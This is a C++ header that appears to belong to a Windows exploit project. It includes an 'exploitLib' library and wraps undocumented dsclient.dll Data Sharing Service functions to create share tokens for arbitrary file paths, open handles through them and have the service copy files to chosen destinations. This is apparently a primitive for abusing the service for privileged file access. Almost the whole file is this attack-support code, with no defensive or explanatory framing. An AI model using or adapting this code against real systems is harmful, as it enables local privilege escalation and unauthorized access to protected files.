#pragma once  
#include "../../../pch.h"
#include "../../exploitLib/include/exploitLib/macros.h"
#include "../../exploitLib/include/exploitLib/misc.h"
#include "../../exploitLib/include/exploitLib/str.h"

#include "../../exploitLib/include/exploitLib/exploitLib.h"

enum DS_SCOPE_TYPE
{
   UserSid
};

enum class DS_SHARE_MODE
{
   None = 0,
   Read,
   Write,
   ReadWrite,
   Delete,
   ReadDelete,
   WriteDelete,
   ReadWriteDelete
};

enum class DS_SHARE_PERMISSION
{
   Read = 0,
   Write,
   ReadWrite
};
struct DATA_SHARE_SCOPE_ENTRY {
   /* Offset: 0 */ /* ENUM16 */	int scopeType;
   /* Offset: 8 */ /* unique */	wchar_t* scopeValue;
};

/* Memory Size: 328 */
struct DATA_SHARE_SCOPE {
   /* Offset: 0 */					int scopeCount;
   /* Offset: 8 */ /* V:(FC_NORMAL_CONFORMANCE)(-8)(FC_ZERO)(FC_ULONG)(Early) */
   struct DATA_SHARE_SCOPE_ENTRY entries[20];
};
/* Memory Size: 336  */
struct DATA_SHARE_CTRL {
   /* Offset: 0 */ /* ENUM16 */	int sharePermission;
   /* Offset: 4 */ /* ENUM16 */	int shareMode;
   /* Offset: 8 */					struct DATA_SHARE_SCOPE scope;
};

IMPORTAPI(L"dsclient.dll", DSCreateSharedFileToken, int, LPCWSTR file, DATA_SHARE_CTRL*, int, int, wchar_t** token)
IMPORTAPI(L"dsclient.dll", DSOpenSharedFile, int, LPCWSTR token, int, HANDLE*)
IMPORTAPI(L"dsclient.dll", DSCopyFromSharedFile, int, LPCWSTR token, LPCWSTR destination)




x::handle getHandleFromToken(std::wstring wtoken)
{
   HANDLE h = 0;
   wchar_t* token = const_cast<wchar_t*>( wtoken.c_str() );

   DSOpenSharedFile(token, 0, &h);
   if (token == nullptr || h == 0) throw std::exception( NT::unistr{ L"An error happened during opening handle from token " + wtoken } );

   std::wcout << (L"\nopened handle to file having : "s + token + L"\n") << std::endl;
   return x::handle::make(h);
}


void copyFromToken(std::wstring wtoken, std::wstring dest)
{

   HANDLE h = 0;
   wchar_t* token = const_cast<wchar_t*>(wtoken.c_str());

   if (DSCopyFromSharedFile(token, dest.c_str()))
      throw std::exception(("An error happened during the service initiated movement of:"s + x::unistr{ wtoken }.asString() + " to:"s + x::unistr{ dest }.asString()).c_str());

   std::wcout << (L"\nCopied the file having token: "s + token + L" to: " + dest + L"\n") << std::endl;
}

x::handle createTokenAndGetHandle( std::string fromA )
{
   std::wstring from{ fromA.begin(),fromA.end() };
   DATA_SHARE_CTRL share_options{ 0x00 };
   share_options.sharePermission =2;
   share_options.shareMode =3;
   share_options.scope.scopeCount = 1;

   auto SID = NT::misc::exportNS::getCurrentUserSidString();

   share_options.scope.entries[0] = { 0, const_cast<wchar_t*>(SID.c_str()) };

   wchar_t* token{};
   DSCreateSharedFileToken(from.c_str(), &share_options,0 ,0, &token);
   if (token == nullptr) throw std::exception{ NT::unistr{ L"Could not get token for file:"s + (from) } };

   std::wcout << L"\nCreated a token for: "s + from + L" having value: " + token + L"\n" << std::endl;
   HANDLE h = 0;
  
       DSOpenSharedFile(token, 0, &h);
       if (token == nullptr || h == 0) throw std::exception(NT::unistr{ L"An error happened during opening handle to " + from  });

   std::wcout << (L"\nopened handle to file having : "s + token +L"\n") << std::endl;
   return x::handle::make( h );
}

void createTokenAndCopyFile(std::wstring from, std::wstring to)
{

   DATA_SHARE_CTRL share_options{ 0x00 };
   share_options.sharePermission = 2;
   share_options.shareMode = 3;
   share_options.scope.scopeCount = 1;

   auto SID =  NT::misc::exportNS::getCurrentUserSidString();

   share_options.scope.entries[0] = { 0, const_cast<wchar_t*>(SID.c_str()) };

   wchar_t* token{};
   DSCreateSharedFileToken(from.c_str(), &share_options, 0, 0, &token);
   if (token == nullptr) throw std::exception{ NT::unistr{ L"Could not get token for file:"s + (from) } };

   std::wcout << L"\nCreated a token for: "s + from + L" having value: " + token + L"\n" << std::endl;

   if (DSCopyFromSharedFile(token, to.c_str()))
       throw std::exception( ("An error happened during the service initiated movement of:"s + x::unistr{ from }.asString() +" to:"s + x::unistr{ to }.asString()).c_str() );

   std::wcout << (L"\nCopied the file having token: "s + token + L" to: " + to + L"\n") << std::endl;
}